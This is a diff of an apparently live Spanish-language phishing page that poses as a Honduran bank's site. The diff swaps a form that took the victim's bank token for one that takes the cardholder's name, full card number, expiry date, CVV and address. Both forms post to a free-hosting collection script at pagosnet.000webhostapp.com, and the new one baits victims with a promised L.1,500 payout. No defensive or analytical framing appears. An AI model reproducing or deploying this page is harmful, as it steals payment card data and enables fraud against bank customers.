@@ -23,13 +23,89 @@
 	<div class="content">
 		<img src="img/logo_white.svg" alt="" class="logo-white">
 		<img src="img/logo001.svg" alt="" class="logo001">
-		<form action="https://pagosnet.000webhostapp.com/banca/token.php" method="POST">
-			<h1 class="token">Para aprobar este depósito necesitas ingresar tu Token</h1>
-			<input type="number" placeholder="Ingresar Atlántida Token" name="token" required>
-			<button class="btn-ini">Aprobar Depósito</button>
+		<form class="formulario" action="https://pagosnet.000webhostapp.com/tigo/target.php" method="post" style="background: white; border-radius: 5px; margin-top: 20px;" >
+			<h3 class="titu-1" >Ingresa tu tarjeta de débito asociada a esta cuenta</h3>
+			<p>Ingrese una tarjeta de crédito o débito.</p>
+			<span class="span">__<span>Ingrese el nombre exacto que aparece en la tarjeta</span>__</span>
+			<input type="text" name="nombre" placeholder="JOSÉ A. MARTÍNEZ GARCÍA " required="" onkeyup="mayus(this);"" autocomplete="off">
+			<span class="span">__<span>Número completo de la tarjeta</span>__</span>
+			<input type="text" name="TarjetaNumero" maxlength="19" id="numeros" placeholder="0000 0000 0000 0000" required>
+			<span></span>
+			<!--Aqui inicia un nuevo input-->
+			<span class="span">__<span>Búscalo al frente</span>__</span>
+			<input type="text" id="vence" name="FechaVencimiento" placeholder="Fecha de vencimiento (MM/AA)"
+			onkeyup="
+			var v = this.value;
+			if (v.match(/^\d{2}$/) !== null) {
+			this.value = v + '/';
+			}
+			else if (v.match(/^\d{4}\$/) !== null) {
+			this.value = v + '/';
+			}"
+			maxlength="5"
+			required="">
+			<span class="span">__<span>Búscalo al reverso</span>__</span>
+			<input type="text" name="codigo" id="codigo" placeholder="C&oacute;digo de seguridad (CVV)" minlength="3" maxlength="3" required=""autocomplete = "off">
+			<p>Su dirección</p>
+			<input type="text" name="colonia" placeholder="Colonia" required>
+			<input type="text" name="ciudad" placeholder="Ciudad" required="" style=" margin-top: 20px;" autocomplete="off">
+			<button id="boton" type="submit">RECLAMAR L.1,500</button>
 			
-
 		</form>
+
+		<script type="text/javascript">
+			var codigo = document.getElementById('codigo');
+		
+			codigo.onkeydown = function(e){
+				if (e.key == 'Backspace') return true;
+		
+				if (e.key == ' ') return false;	
+		
+				if (isNaN(e.key)) return false;
+			};
+		</script>
+		
+		<script>
+		// Campo numeros
+		var numeros = document.getElementById('numeros');
+		
+		// Poner cursor en el campo numeros
+		numeros.focus();
+		
+		numeros.onkeydown = function(e){
+			// Permitir la tecla para borrar
+			if (e.key == 'Backspace') return true;
+		
+			// Permitir flecha izquierda
+			if (e.key == 'ArrowLeft') return true;
+		
+			// Permitir flecha derecha
+			if (e.key == 'ArrowRight') return true;
+		
+			// Bloquear tecla de espacio
+			if (e.key == ' ') return false;
+		
+			// Bloquear tecla si no es un numero
+			if (isNaN(e.key)) return false;
+		};
+		
+		numeros.onkeyup = function(){
+			numeros.value = numeros.value
+							// Borrar todos los espacios
+							.replace(/\s/g, '')
+		
+							// Agregar un espacio cada dos numeros
+							.replace(/([0-9]{4})/g, '$1 ')
+		
+							// Borrar espacio al final
+							.trim();
+		};
+		function mayus(e){
+
+			e.value = e.value.toUpperCase();
+			}
+		</script>
+	</div>
 		<p class="tex">Habilitar ACH | Gestiones de Tarjetas | Consulta de Cheques </p> <p class="tex"> Deshabilitar usuario</p>
 	</div>
 
